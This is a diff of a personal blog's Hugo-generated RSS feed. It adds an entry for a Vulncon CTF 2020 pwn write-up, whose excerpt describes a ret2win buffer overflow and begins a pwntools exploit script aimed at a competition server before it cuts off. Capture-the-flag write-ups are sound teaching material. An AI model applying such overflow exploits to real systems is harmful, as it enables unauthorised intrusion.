@@ -5,10 +5,21 @@
     <link>/tags/untagged/</link>
     <description>Recent content in untagged on Hello World. I am Dito Prabowo</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sun, 20 Dec 2020 16:59:57 +0700</lastBuildDate>
+    <lastBuildDate>Sun, 20 Dec 2020 18:43:33 +0700</lastBuildDate>
     
 	<atom:link href="/tags/untagged/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Writeup PWN Vulncon CTF 2020</title>
+      <link>/posts/writeup-pwn-vulncon-ctf-2020/</link>
+      <pubDate>Sun, 20 Dec 2020 18:43:33 +0700</pubDate>
+      
+      <guid>/posts/writeup-pwn-vulncon-ctf-2020/</guid>
+      <description>warmup This was obvious ret2win function, since it had a function named overflowed which, once called, return the shell, then using the gdb we find the offset to the RIP was 24, then using pwntools, we get the shell and the flag.
+ Since the remote system was the Ubuntu 18.04 or higher, using a ret we aligned the payload and profit.
+ from pwn import * p = remote(&amp;#34;35.232.11.215&amp;#34;, 49153) elf = ELF(&amp;#34;w4rmup&amp;#34;) payload = b&amp;#34;A&amp;#34;*24 payload += p64(0x0000000000401016) payload += p64(elf.</description>
+    </item>
     
     <item>
       <title>Writeup Web Vulncon CTF 2020 Swigger</title>
